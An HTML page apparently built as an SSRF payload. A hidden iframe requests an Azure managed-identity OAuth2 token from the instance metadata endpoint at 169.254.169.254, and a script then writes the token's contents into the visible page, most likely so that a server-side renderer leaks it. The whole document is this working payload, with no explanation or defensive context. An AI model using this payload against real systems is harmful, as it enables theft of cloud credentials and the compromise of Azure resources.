<html>
  <head>
    <title>Fetch Azure Metadata via Iframe</title>
  </head>
  <body>
    <h1>Fetching Azure Metadata via Iframe</h1>
    <p>Attempting to fetch Azure metadata...</p>
    <iframe id="azureIframe" src="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" style="display:none;"></iframe>
    <p id="result">Iframe response will appear here...</p>
    <script>
      const iframe = document.getElementById('azureIframe');
      iframe.onload = function() {
        try {
          const response = iframe.contentWindow.document.body.innerText;
          document.getElementById('result').innerText = 'Iframe response: ' + response;
        } catch (e) {
          document.getElementById('result').innerText = 'Error accessing iframe content: ' + e.message;
        }
      };
    </script>
  </body>
</html>
